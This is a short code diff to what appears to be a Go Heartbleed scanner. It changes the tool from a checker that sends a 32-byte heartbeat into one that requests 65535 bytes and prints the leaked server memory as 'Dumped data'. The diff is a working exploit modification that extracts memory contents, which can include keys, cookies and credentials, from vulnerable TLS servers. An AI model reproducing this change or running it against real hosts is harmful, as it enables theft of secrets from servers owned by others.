@@ -29,11 +29,12 @@ func main() {
 		fmt.Println("SECURE - timed out while waiting for a response from", host)
 		os.Exit(0)
 	}()
-
-	_, _, err = c.Heartbeat(32, nil)
+	var resp []byte
+	_, resp, err = c.Heartbeat(65535, nil)
 	switch err {
 	case nil:
 		fmt.Printf("INSECURE - %s has the heartbeat extension enabled and is vulnerable\n", host)
+		fmt.Printf("Dumped data:\n--------\n%s\n--------\n", string(resp[:]))
 		os.Exit(1)
 	case tls.ErrNoHeartbeat:
 		fmt.Printf("SECURE - %s does not have the heartbeat extension enabled\n", host)
